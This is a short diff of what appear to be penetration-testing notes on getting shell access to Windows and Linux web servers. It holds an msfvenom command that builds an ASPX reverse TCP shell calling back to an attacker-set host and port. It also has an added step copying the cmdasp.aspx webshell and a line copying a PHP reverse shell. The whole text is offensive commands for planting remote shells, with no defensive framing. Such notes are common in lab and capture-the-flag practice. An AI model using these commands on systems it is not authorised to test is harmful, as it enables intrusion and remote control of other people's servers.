@@ -14,6 +14,10 @@ Windows machine
 
     msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=80 -f aspx -o shell.aspx
 
+OR use a webshell instead
+
+    cp /usr/share/webshells/aspx/cmdasp.aspx .
+
 Linux machine
 
     cp /usr/share/webshells/php/php-reverse-shell.php .
